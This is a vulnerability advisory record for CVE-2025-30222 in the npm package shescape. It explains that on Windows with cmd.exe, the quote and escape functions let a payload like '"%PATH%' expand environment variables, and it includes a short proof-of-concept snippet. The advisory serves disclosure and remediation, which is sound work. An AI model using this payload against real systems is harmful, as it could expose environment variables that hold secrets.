---
identifier: "CVE-2025-30222"
identifiers:
- "CVE-2025-30222"
- "GHSA-66pp-5p9w-q87j"
package_slug: "npm/shescape"
title: "Shescape has potential environment variable exposure on Windows with CMD"
description: "This impact users of Shescape on Windows that explicitly configure `shell:
  'cmd.exe'` or `shell: true` using any of `quote`/`quoteAll`/`escape`/`escapeAll`.\n\nAn
  attacker may be able to get read-only access to environment variables. Example:\n\n```javascript\nimport
  * as cp from \"node:child_process\";\nimport { Shescape } from \"shescape\";\n\n//
  1. Prerequisites\nconst shescape = new Shescape({\nshell: \"cmd.exe\",\n// Or\nshell:
  true, // Only if the default shell is CMD\n});\n\n// 2. Payload\nconst payload =
  '\"%PATH%';\n\n// 3. Usage\nlet escapedPayload;\n\nescapedPayload = shescape.quote(payload);\n//
  Or\nescapedPayload = shescape.quoteAll([payload]);\n// Or\nescapedPayload = shescape.escape(payload);\n//
  Or\nescapedPayload = shescape.escapeAll([payload]);\n\n// And (example)\nconst result
  = cp.execSync(`echo Hello ${escapedPayload}`, options);\n\n// 4. Impact\nconsole.log(result.toString());\n//
  Outputs \"Hello\" followed by the contents of the PATH environment variable\n```\n\nFor
  Shescape prior to v2.0.0, the `options` object must have `shell: 'cmd.exe'` or `shell:
  undefined` and `interpolation: true`."
date: "2025-03-26"
pubdate: "2025-03-26"
affected_range: ">=1.7.2 <2.1.2"
fixed_versions:
- "2.1.2"
affected_versions: "All versions starting from 1.7.2 before 2.1.2"
not_impacted: "All versions before 1.7.2, all versions starting from 2.1.2"
solution: "Upgrade to version 2.1.2 or above."
urls:
- "https://nvd.nist.gov/vuln/detail/CVE-2025-30222"
- "https://github.com/advisories/GHSA-66pp-5p9w-q87j"
- "https://github.com/ericcornelissen/shescape/security/advisories/GHSA-66pp-5p9w-q87j"
- "https://github.com/ericcornelissen/shescape/pull/1916"
- "https://github.com/ericcornelissen/shescape/commit/0a81f1eb077bab8caae283a2490cd7be9af179c6"
- "https://github.com/ericcornelissen/shescape"
- "https://github.com/ericcornelissen/shescape/releases/tag/v2.1.2"
uuid: "de4cfc04-9978-4355-9d46-4c92979f45a9"
cwe_ids:
- "CWE-200"
- "CWE-937"
- "CWE-1035"
